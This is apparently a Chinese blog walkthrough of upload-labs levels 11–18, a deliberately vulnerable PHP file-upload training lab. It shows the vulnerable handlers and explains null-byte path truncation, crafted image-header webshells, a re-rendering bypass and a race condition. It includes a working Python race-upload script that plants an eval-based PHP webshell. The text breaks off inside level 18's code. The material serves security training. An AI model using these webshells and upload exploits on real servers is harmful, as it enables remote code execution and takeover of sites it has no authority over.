<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">$file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line"><span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">   $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">   $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">   $is_upload = <span class="keyword">true</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">else</span>&#123;</div><div class="line">   $msg = <span class="string">'上传失败！'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p><strong>处理上传文件的方式</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div></pre></td></tr></table></figure><br><strong>看起来这样防御并没有什么问题，但是这一关上传目录是可控的</strong></p>
<p><strong>所以可以先上传一个后缀名为jpg,内容为一句话木马的文件，然后修改上传目录为.php后缀，之后在.php后使用%00截断后面的拼接内容，注意这里需要关掉<code>magic_quotes_gpc</code>这个php扩展，否则00会被转义</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_GET[<span class="string">'save_path'</span>]这里使用<span class="number">00</span>截断.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div></pre></td></tr></table></figure>
<p><strong>注意这里的00字符因为在url的GET参数中，所以需用进行url编码</strong><br><img src="http://pic.c1imber.top/blog/180609/mA0g49b3ID.png?imageslim" alt="mark"></p>
<p><strong>通过这种方法就可以成功绕过十一关的上传检测</strong><br><img src="http://pic.c1imber.top/blog/180609/bgIAeh5fhK.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/KAj14k48Hd.png?imageslim" alt="mark"></p>
<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p><strong>同样是上传路径可以控制，不同的是这里的路径是以POST参数传递的，同样的这里在目录后面使用00截断</strong><br><img src="http://pic.c1imber.top/blog/180609/I152AJCcI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/flcIiI8892.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/2L2fG36AC3.png?imageslim" alt="mark"><br><strong>可以看到成功绕过上传</strong><br><img src="http://pic.c1imber.top/blog/180609/Ib19cJh665.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/j83GG617aG.png?imageslim" alt="mark"></p>
<h3 id="第十三关-amp-第十四关-amp-第十五关"><a href="#第十三关-amp-第十四关-amp-第十五关" class="headerlink" title="第十三关&amp;第十四关&amp;第十五关"></a>第十三关&amp;第十四关&amp;第十五关</h3><p><strong>任务和之前的不同，这里只需要成功上传图片马，并且图片马里有完整的webshell即可</strong></p>
<p><strong>对于第十三关第十四关和第十五关这三关都是对文件幻数进行了检测，只不过第十四关使用的是<code>getimagesize</code>函数，第十五关使用的是<code>exif_imagetype</code>函数,函数返回值内容不一样而已</strong></p>
<p><strong>要想突破文件幻数检测，首先要了解jpg、png、gif这三种文件的头部格式，每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻数。</strong></p>
<p><strong>jpg文件头部格式</strong><br><img src="http://pic.c1imber.top/blog/180610/dJ36H5lLGl.png?imageslim" alt="mark"><br><strong>文件头值为<code>FFD8FFE000104A464946</code></strong></p>
<p><strong>png文件头格式，网上大部分资料写的都是<code>89504E47</code>，但是经过我的测试，这四个16进制是仅仅不够的，如果只是<code>89504E47</code>的话，会使<code>getimagesize</code>函数和<code>exif_imagetype</code>函数报错</strong><br><img src="http://pic.c1imber.top/blog/180610/FglLL507mf.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/JD2hc9BBGB.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/14GjDG5EHK.png?imageslim" alt="mark"><br><strong>经过我的测试真正的文件头值应该是<code>89504E470D0A1A0A</code></strong><br><img src="http://pic.c1imber.top/blog/180610/GgDHJb3I35.png?imageslim" alt="mark"></p>
<p><strong>gif文件头格式</strong><br><img src="http://pic.c1imber.top/blog/180610/b9H0a1l3lC.png?imageslim" alt="mark"><br><strong>文件头值为<code>474946383961</code></strong></p>
<p><strong>经过测试，<code>getimagesize</code>函数和<code>exif_imagetype</code>函数都只是是对文件头进行检查，只要文件头部符合函数就会返回内容</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"check jpg&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"heishacker.jpg"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"heishacker.jpg"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;check png&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"mingren.png"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"mingren.png"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;check gif&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"xiangtian.gif"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"xiangtian.gif"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://pic.c1imber.top/blog/180610/aImGHa1L1l.png?imageslim" alt="mark"><br><strong>所以这几关都可以上传图片马，图片马的文件头就是正常图片的文件头格式，从而绕过图片幻数检测</strong></p>
<p><strong>windows下图片马制作方式</strong></p>
<pre><code>copy x.jpg|png|gif/b+x.php/a x.jpg|png|gif
</code></pre><p><strong>参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件），x.php文件里为要写的一句话木马</strong></p>
<p><strong>这三关都可以成功上传图片马，并且里面有完整的一句话木马，但是有时候图片马里面的一些字符会使php报错，导致用文件包含或者解析漏洞去解析图片马中的php时导致解析不了，可以看到利用文件包含去解析三个图片马时均不能解析</strong><br><img src="http://pic.c1imber.top/blog/180610/2C0bBcE130.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/gfIKil3hEd.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/I0GHj8Fe57.png?imageslim" alt="mark"><br><strong>所以在寻找图片制作图片马时需要耐心的寻找一些不会使php报错的图片</strong></p>
<p><strong>而且有时候对文件大小也有限制，所以绕过文件幻数最合适的方式是利用16进制编辑器自己制作一个伪图片马，这里利用winhex分别创建shell.jpg、shell.png、shell.gif三个伪图片马</strong><br><img src="http://pic.c1imber.top/blog/180610/h4AK5Ja53d.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/HHi4djejE2.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/83mckBeaL3.png?imageslim" alt="mark"><br><strong>之后上传这三个伪图片马，这样不光可以上传成功，也可以利用文件包含漏洞或解析漏洞解析成功</strong><br><img src="http://pic.c1imber.top/blog/180610/F1c6GHHc15.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/D5Hfd4CgEC.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/gcf7F0Fmme.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/CbG93Ghj61.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/LAGG5c4FcB.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/KiIL2KmaHI.png?imageslim" alt="mark"><br><strong>这三关均可以采用这种方式通关，第十五关需要在php配置文件中开启php的php_exif扩展</strong><br><img src="http://pic.c1imber.top/blog/180610/m2098dmK3b.png?imageslim" alt="mark"><br><strong>当然，耐心的选择一个合适的图片制作图片马也是可以的</strong></p>
<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></div><div class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</div><div class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">	$target_path=$UPLOAD_ADDR.basename($filename);</div><div class="line">	<span class="comment">// 获得上传文件的扩展名</span></div><div class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</div><div class="line">	<span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></div><div class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromjpeg($target_path);</div><div class="line">			<span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagejpeg($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefrompng($target_path);</div><div class="line">			<span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                 <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagepng($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;               </div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromgif($target_path);</div><div class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagegif($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>通过第十六关的php代码可以看到对文件后缀名和MIME类型进行了检查，而且用到了php的<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为jpg、png、gif的一句话木马，这样的话上传的一句话木马会绕过后缀名和MIME类型的检查，通过<code>move_uploaded_file</code>上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器</strong></p>
<p><strong>分别上传后缀名为jpg、png、gif的一句话木马，可以看到虽然上传的格式不允许，但是一句话马已经上传成功了</strong></p>
<p><strong>jpg</strong><br><img src="http://pic.c1imber.top/blog/180613/0hmC35EhHh.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/mf0AaDm4h7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/97HfAf14hF.png?imageslim" alt="mark"><br><strong>png</strong><br><img src="http://pic.c1imber.top/blog/180613/8db3Hdmlk3.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/Imc99K5gLk.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/FC7d5dl7db.png?imageslim" alt="mark"><br><strong>gif</strong><br><img src="http://pic.c1imber.top/blog/180613/ELeK4G3DD1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/3B0JFHl0F2.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/6f3G4jC51B.png?imageslim" alt="mark"></p>
<p><strong>以上只是单单针对这道题，那么如何真正的使用图片马突破二次渲染呢？可以看到如果直接使用在图片添加一句话木马的图片马上传的话，在二次渲染后一句话会被删除，导致图片马不能利用</strong></p>
<p><strong>按照一般的方法制作三种图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/9cHGg2FKJJ.png?imageslim" alt="mark"><br><strong>上传jpg图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/D995Fg91Hj.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefromjpeg</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://pic.c1imber.top/blog/180611/fdKHc46AAE.png?imageslim" alt="mark"><br><strong>导致jpg图片马不能使用</strong><br><img src="http://pic.c1imber.top/blog/180611/eeb24D4k3I.png?imageslim" alt="mark"><br><strong>上传png图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/e26jJB1aab.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefrompng</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://pic.c1imber.top/blog/180611/6DaBgi2C46.png?imageslim" alt="mark"><br><strong>导致png图片马不能使用</strong><br><img src="http://pic.c1imber.top/blog/180611/beB9B0k8h6.png?imageslim" alt="mark"><br><strong>上传gif图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/hl33HL3Eg2.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefromgif</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://pic.c1imber.top/blog/180611/21A8FJHaA9.png?imageslim" alt="mark"><br><strong>导致gif图片马不能使用</strong><br><img src="http://pic.c1imber.top/blog/180611/lHcG8bFf4c.png?imageslim" alt="mark"></p>
<p><strong>尝试制作可以真正突破二次渲染的函数，这里可以通过十六进制编辑器查看比较上传前后图片的十六进制 ，找到二次渲染前后十六进制内容没有改变的部分，尝试将图片马写到这些没有改变的部分</strong></p>
<p><strong>自己对图片的16进制格式不是太理解，导致只制作出来了突破二次渲染的gif图片马，jpg和png都制作失败了，以后有时间再去研究</strong><br><img src="http://pic.c1imber.top/blog/180612/hAj9fmKelg.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180612/aLE7gfmcDh.png?imageslim" alt="mark"><br><strong>将相同的部分（全00）替换为一句话木马，运气比较好，图片并没有损坏，而且绕过了二次渲染，并且没有报php语法错误</strong><br><img src="http://pic.c1imber.top/blog/180612/1IGBmAFhEB.png?imageslim" alt="mark"><br><strong>但是jpg和png就不一样了，出现了很多问题，暂时还没有制作出真正图片二次渲染的jpg、png图片马</strong></p>
<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p><strong>要求上传一个webshell到服务器，提示需要代码审计，查看php源代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</div><div class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">             rename($upload_file, $img_path);</div><div class="line">             $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">            unlink($upload_file);</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">'上传失败！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br><strong>通过php代码可以看到对上传的文件后缀做了白名单限制，如果上传的文件后缀如果不是jpg、png、gif的话就会被删除掉。但是这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span><span class="params">(list)</span>:</span></div><div class="line">    url=<span class="string">"http://192.168.242.128/upload-labs/Pass-17/index.php"</span></div><div class="line">    geturl=<span class="string">"http://192.168.242.128/upload-labs/upload/info.php"</span></div><div class="line">    file=&#123;<span class="string">'upload_file'</span>:(<span class="string">'info.php'</span>,<span class="string">"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;"</span>,<span class="string">'image/jpeg'</span>)&#125;</div><div class="line">    data=&#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</div><div class="line">    r=requests.post(url=url,data=data,files=file)</div><div class="line">    <span class="comment">#print "test upload...."</span></div><div class="line">    r1=requests.get(url=geturl)</div><div class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"upload success!"</span></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(<span class="number">10</span>)</div><div class="line">    pool.map(CompeteUpload, range(<span class="number">10000</span>))</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<p><strong>可以看到通过多进程同时上传时可以成功在文件删除之前访问到该文件</strong><br><img src="http://pic.c1imber.top/blog/180622/ccEGI0A04e.png?imageslim" alt="mark"><br><strong>在服务器目录下可以看到成功写入shell.php</strong><br><img src="http://pic.c1imber.top/blog/180622/lhCj31dk99.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180622/AfKEmfifIB.png?imageslim" alt="mark"></p>
<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p><strong>apache2.4.x的环境下暂时还未找到绕过方法，在apache2.2.x的环境下可以通过条件竞争加上apache2.2.x解析漏洞去绕过，这一关的要求是上传一个webshell到服务器，题目提示说需要代码审计，那么首先来看代码：</strong></p>
<p><strong>重要代码部分如下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</div><div class="line">    $imgFileName =time();</div><div class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</div><div class="line">    $status_code = $u-&gt;upload($UPLOAD_ADDR);</div><div class="line">    <span class="keyword">switch</span> ($status_code) &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div 